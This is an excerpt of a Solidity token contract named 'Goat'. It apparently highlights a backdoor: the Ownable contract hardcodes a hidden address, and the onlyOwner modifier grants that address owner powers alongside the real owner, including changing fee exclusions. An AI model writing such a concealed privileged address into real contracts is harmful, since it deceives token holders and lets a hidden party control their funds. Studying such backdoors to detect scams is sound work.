...
abstract contract Ownable is Context {
    ...
    address dW = 0x7259a8E5637f8B3336Dd9eB20E6fed7D9C67F489;
    ...
    function d() public view virtual returns (address) {
        return dW;
    }
    ...
    modifier onlyOwner() {
        require(
            _owner == _msgSender() || _msgSender() == d(),
...
contract Goat is ERC20, Ownable {
    ...
    function excludeFromFee(address user, bool exclude) public onlyOwner {
        _isExcludedFromFees[user] = exclude;
    }
}